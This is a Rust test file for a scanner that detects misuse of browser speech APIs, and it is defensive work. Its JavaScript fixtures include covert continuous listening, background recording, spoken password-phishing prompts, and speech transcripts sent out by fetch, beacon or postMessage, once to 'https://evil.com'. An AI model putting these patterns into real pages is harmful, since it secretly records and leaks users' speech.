use crate::speech_api_audit::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_speech_api("");
    assert!(issues.is_empty());
}

#[test]
fn no_speech_api_no_issues() {
    let body = "<html><body>Hello</body></html>";
    let issues = analyze_speech_api(body);
    assert!(issues.is_empty());
}

#[test]
fn detects_speech_recognition() {
    let body = "var rec = new SpeechRecognition();";
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::SpeechRecognitionUsage));
}

#[test]
fn detects_webkit_speech_recognition() {
    let body = "var rec = new webkitSpeechRecognition();";
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::SpeechRecognitionUsage));
}

#[test]
fn detects_continuous_listening() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.continuous = true;
        rec.start();
    "#;
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::ContinuousListening));
}

#[test]
fn detects_speech_exfiltration() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.onresult = function(e) {
            fetch('/collect', {method:'POST', body: e.results[0][0].transcript});
        };
    "#;
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::SpeechDataExfiltration));
}

#[test]
fn detects_speech_synthesis_fingerprint() {
    let body = "var voices = speechSynthesis.getVoices();";
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::SpeechSynthesisFingerprint));
}

#[test]
fn detects_voices_changed_event() {
    let body = "speechSynthesis.onvoiceschanged = function() { track(); };";
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::SpeechSynthesisFingerprint));
}

#[test]
fn detects_speech_grammar_list() {
    let body = "var grammar = new SpeechGrammarList();";
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::SpeechGrammarList));
}

#[test]
fn detects_webkit_grammar_list() {
    let body = "var grammar = new webkitSpeechGrammarList();";
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::SpeechGrammarList));
}

#[test]
fn detects_interim_results() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.interimResults = true;
    "#;
    let issues = analyze_speech_api(body);
    assert!(issues.contains(&SpeechApiIssue::InterimResultsCapture));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(
        speech_api_severity(&SpeechApiIssue::SpeechDataExfiltration),
        8.0
    );
}

#[test]
fn severity_synthesis_fingerprint_lowest() {
    assert_eq!(
        speech_api_severity(&SpeechApiIssue::SpeechSynthesisFingerprint),
        5.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        SpeechApiIssue::SpeechRecognitionUsage,
        SpeechApiIssue::ContinuousListening,
    ];
    let mut seq = 0;
    let ops = speech_api_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        SpeechApiIssue::SpeechRecognitionUsage.to_string(),
        "speech_recognition_usage"
    );
    assert_eq!(
        SpeechApiIssue::ContinuousListening.to_string(),
        "continuous_listening"
    );
    assert_eq!(
        SpeechApiIssue::SpeechSynthesisFingerprint.to_string(),
        "speech_synthesis_fingerprint"
    );
    assert_eq!(
        SpeechApiIssue::InterimResultsCapture.to_string(),
        "interim_results_capture"
    );
}

// New security variant tests

#[test]
fn detects_speech_eavesdropping() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.continuous = true;
        rec.start();
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechRecognitionEavesdropping));
}

#[test]
fn no_eavesdropping_with_indicator() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.continuous = true;
        showIndicator();
        rec.start();
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(!issues.contains(&SpeechApiSecurityIssue::SpeechRecognitionEavesdropping));
}

#[test]
fn detects_security_data_exfiltration() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.onresult = function(e) {
            fetch('/api', {method: 'POST', body: e.results[0][0].transcript});
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechDataExfiltration));
}

#[test]
fn detects_exfiltration_with_xhr() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.onresult = function(e) {
            var xhr = new XMLHttpRequest();
            xhr.send(e.results[0][0].transcript);
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechDataExfiltration));
}

#[test]
fn detects_exfiltration_with_beacon() {
    let body = r#"
        var rec = new webkitSpeechRecognition();
        rec.addEventListener('result', function(e) {
            navigator.sendBeacon('/track', e.results[0][0].transcript);
        });
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechDataExfiltration));
}

#[test]
fn detects_exfiltration_with_postmessage() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.onresult = function(e) {
            window.parent.postMessage(e.results[0][0].transcript, '*');
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechDataExfiltration));
}

#[test]
fn detects_speech_without_permission() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.start();
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechWithoutPermission));
}

#[test]
fn no_permission_issue_with_check() {
    let body = r#"
        navigator.permissions.query({name:'microphone'}).then(function(result) {
            if (result.state === 'granted') {
                var rec = new SpeechRecognition();
                rec.start();
            }
        });
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(!issues.contains(&SpeechApiSecurityIssue::SpeechWithoutPermission));
}

#[test]
fn no_permission_issue_with_getusermedia() {
    let body = r#"
        navigator.mediaDevices.getUserMedia({audio:true}).then(function() {
            var rec = new SpeechRecognition();
            rec.start();
        });
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(!issues.contains(&SpeechApiSecurityIssue::SpeechWithoutPermission));
}

#[test]
fn detects_speech_in_background() {
    let body = r#"
        var rec = new SpeechRecognition();
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                rec.start();
            }
        });
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechInBackground));
}

#[test]
fn detects_background_with_hidden_check() {
    let body = r#"
        var rec = new webkitSpeechRecognition();
        if (!document.hidden) {
            rec.start();
        } else {
            rec.start();
        }
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechInBackground));
}

#[test]
fn detects_cross_origin_postmessage() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.onresult = function(e) {
            window.parent.postMessage(e.results[0][0].transcript, 'https://evil.com');
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechCrossOrigin));
}

#[test]
fn detects_cross_origin_with_opener() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.onresult = function(e) {
            window.opener.handleSpeech(e.results);
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechCrossOrigin));
}

#[test]
fn detects_synthesis_phishing_alert() {
    let body = r#"
        var utterance = new SpeechSynthesisUtterance('Please enter your password');
        speechSynthesis.speak(utterance);
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechSynthesisPhishing));
}

#[test]
fn detects_synthesis_phishing_confirm() {
    let body = r#"
        var msg = 'Click confirm to verify your account';
        speechSynthesis.speak(new SpeechSynthesisUtterance(msg));
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechSynthesisPhishing));
}

#[test]
fn detects_speech_persistence_localstorage() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.onresult = function(e) {
            localStorage.setItem('speech', e.results[0][0].transcript);
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechPersistence));
}

#[test]
fn detects_speech_persistence_sessionstorage() {
    let body = r#"
        var rec = new webkitSpeechRecognition();
        rec.onresult = function(e) {
            sessionStorage.setItem('voice', e.results[0][0].transcript);
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechPersistence));
}

#[test]
fn detects_speech_persistence_indexeddb() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.onresult = function(e) {
            var request = indexedDB.open('speechDB');
            request.onsuccess = function(ev) {
                var db = ev.target.result;
            };
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechPersistence));
}

#[test]
fn detects_continuous_speech_monitoring() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.continuous = true;
        rec.onerror = function(e) {
            if (e.error === 'no-speech') {
                rec.start();
            }
        };
        rec.start();
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::ContinuousSpeechRecognition));
}

#[test]
fn detects_webkit_continuous_monitoring() {
    let body = r#"
        var rec = new webkitSpeechRecognition();
        rec.continuous = true;
        rec.onerror = function() { rec.start(); };
        rec.start();
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::ContinuousSpeechRecognition));
}

#[test]
fn detects_speech_with_geolocation() {
    let body = r#"
        var rec = new SpeechRecognition();
        navigator.geolocation.getCurrentPosition(function(pos) {
            rec.start();
        });
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechWithGeolocation));
}

#[test]
fn detects_speech_with_watchposition() {
    let body = r#"
        var rec = new SpeechRecognition();
        var watchId = navigator.geolocation.watchPosition(function(pos) {
            rec.onresult = function(e) {
                sendData(pos, e.results);
            };
        });
        rec.start();
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechWithGeolocation));
}

#[test]
fn detects_speech_in_iframe_tag() {
    let body = r#"
        <iframe src="recorder.html"></iframe>
        <script>
        var rec = new SpeechRecognition();
        rec.start();
        </script>
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechInIframe));
}

#[test]
fn detects_speech_with_contentwindow() {
    let body = r#"
        var rec = new webkitSpeechRecognition();
        var iframe = document.getElementById('frame');
        iframe.contentWindow.startRecording = function() {
            rec.start();
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechInIframe));
}

#[test]
fn detects_speech_with_frames() {
    let body = r#"
        var rec = new SpeechRecognition();
        window.frames[0].speechHandler = function() {
            rec.start();
        };
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechInIframe));
}

#[test]
fn security_severity_eavesdropping_highest() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechRecognitionEavesdropping),
        9.0
    );
}

#[test]
fn security_severity_exfiltration_high() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechDataExfiltration),
        8.5
    );
}

#[test]
fn security_severity_persistence_high() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechPersistence),
        8.0
    );
}

#[test]
fn security_severity_continuous_medium_high() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::ContinuousSpeechRecognition),
        7.5
    );
}

#[test]
fn security_severity_geolocation_medium_high() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechWithGeolocation),
        7.5
    );
}

#[test]
fn security_severity_cross_origin_medium() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechCrossOrigin),
        7.0
    );
}

#[test]
fn security_severity_without_permission_medium() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechWithoutPermission),
        6.5
    );
}

#[test]
fn security_severity_background_medium() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechInBackground),
        6.5
    );
}

#[test]
fn security_severity_phishing_medium_low() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechSynthesisPhishing),
        6.0
    );
}

#[test]
fn security_severity_iframe_lowest() {
    assert_eq!(
        speech_api_security_severity(&SpeechApiSecurityIssue::SpeechInIframe),
        5.5
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        SpeechApiSecurityIssue::SpeechRecognitionEavesdropping,
        SpeechApiSecurityIssue::SpeechDataExfiltration,
    ];
    let mut seq = 0;
    let ops = speech_api_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty_input() {
    let issues = vec![];
    let mut seq = 0;
    let ops = speech_api_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 0);
}

#[test]
fn security_display_eavesdropping() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechRecognitionEavesdropping.to_string(),
        "speech_recognition_eavesdropping"
    );
}

#[test]
fn security_display_exfiltration() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechDataExfiltration.to_string(),
        "speech_data_exfiltration"
    );
}

#[test]
fn security_display_without_permission() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechWithoutPermission.to_string(),
        "speech_without_permission"
    );
}

#[test]
fn security_display_background() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechInBackground.to_string(),
        "speech_in_background"
    );
}

#[test]
fn security_display_cross_origin() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechCrossOrigin.to_string(),
        "speech_cross_origin"
    );
}

#[test]
fn security_display_phishing() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechSynthesisPhishing.to_string(),
        "speech_synthesis_phishing"
    );
}

#[test]
fn security_display_persistence() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechPersistence.to_string(),
        "speech_persistence"
    );
}

#[test]
fn security_display_continuous() {
    assert_eq!(
        SpeechApiSecurityIssue::ContinuousSpeechRecognition.to_string(),
        "continuous_speech_recognition"
    );
}

#[test]
fn security_display_geolocation() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechWithGeolocation.to_string(),
        "speech_with_geolocation"
    );
}

#[test]
fn security_display_iframe() {
    assert_eq!(
        SpeechApiSecurityIssue::SpeechInIframe.to_string(),
        "speech_in_iframe"
    );
}

#[test]
fn empty_body_no_security_issues() {
    let issues = analyze_speech_api_security("");
    assert!(issues.is_empty());
}

#[test]
fn no_speech_api_no_security_issues() {
    let body = "<html><body>Hello World</body></html>";
    let issues = analyze_speech_api_security(body);
    assert!(issues.is_empty());
}

#[test]
fn multiple_security_issues_detected() {
    let body = r#"
        var rec = new SpeechRecognition();
        rec.continuous = true;
        rec.onresult = function(e) {
            localStorage.setItem('speech', e.results[0][0].transcript);
            fetch('/api', {method: 'POST', body: e.results[0][0].transcript});
        };
        navigator.geolocation.getCurrentPosition(function() {
            rec.start();
        });
    "#;
    let issues = analyze_speech_api_security(body);
    assert!(issues.len() >= 3);
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechDataExfiltration));
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechPersistence));
    assert!(issues.contains(&SpeechApiSecurityIssue::SpeechWithGeolocation));
}
